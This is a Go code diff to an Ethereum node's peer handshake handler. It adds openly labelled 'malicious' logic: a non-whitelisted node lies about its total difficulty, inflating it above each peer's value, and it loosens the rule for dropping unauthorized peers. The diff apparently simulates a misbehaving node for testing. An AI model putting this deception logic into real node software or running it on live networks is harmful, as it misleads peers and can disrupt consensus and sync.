@@ -300,6 +300,14 @@ func (pm *ProtocolManager) newPeer(pv int, p *p2p.Peer, rw p2p.MsgReadWriter) *p
 	return newPeer(pv, p, newMeteredMsgWriter(rw))
 }
 
+
+
+var maliciousTD = &struct{
+	value *big.Int
+	sync.Mutex
+	sync.Once
+} {value: big.NewInt(0)}
+
 // handle is the callback invoked to manage the life cycle of an eth peer. When
 // this function terminates, the peer is disconnected.
 func (pm *ProtocolManager) handle(p *peer) error {
@@ -317,10 +325,40 @@ func (pm *ProtocolManager) handle(p *peer) error {
 		number  = head.Number.Uint64()
 		td      = pm.blockchain.GetTd(hash, number)
 	)
+
+	maliciousTD.Do(func() {
+		maliciousTD.value.Set(td)
+	})
+
+	// If I'm not in the list, send big TD
+	iAmWhitelisted := false
+	pm.enodesWhitelistLock.RLock()
+	for _, enode := range pm.enodesWhitelist {
+		if Enode == enode.ID() {
+			iAmWhitelisted = true
+			break
+		}
+	}
+	pm.enodesWhitelistLock.RUnlock()
+
+	maliciousTD.Lock()
+	if !iAmWhitelisted {
+		//lie about TD if I'm malicious >:)
+		td.Set(maliciousTD.value)
+	}
+
 	if err := p.Handshake(pm.networkID, td, hash, genesis.Hash()); err != nil {
 		p.Log().Debug("Ethereum handshake failed", "err", err)
+		maliciousTD.Unlock()
 		return err
 	}
+
+	if !iAmWhitelisted {
+		// && p.td.Cmp(maliciousTD.value) > 0
+		log.Error("I AM MALICIOUS!!!!", "td", maliciousTD.value.String(), "p.td", p.td.String())
+		maliciousTD.value.Add(p.td, big.NewInt(3))
+	}
+	maliciousTD.Unlock()
 
 	if !pm.openNetwork {
 		whitelisted := false
@@ -332,8 +370,9 @@ func (pm *ProtocolManager) handle(p *peer) error {
 			}
 		}
 		pm.enodesWhitelistLock.RUnlock()
-		if !whitelisted && p.td.Uint64() <= head.Number.Uint64() + 1 {
-			p.Log().Info("Dropping unauthorized peer with old TD.", "enode", p.Node().ID())
+		if iAmWhitelisted && !whitelisted && p.td.Uint64() <= head.Number.Uint64() + 1 {
+			p.Log().Info("Dropping unauthorized peer with old TD.",
+				"enode", p.Node().ID(), "expectedTD", head.Number.Uint64() + 1, "peerTD", p.td.Uint64())
 			return errUnauthaurizedPeer
 		}
 		// Todo : pause relaying if not whitelisted until full sync
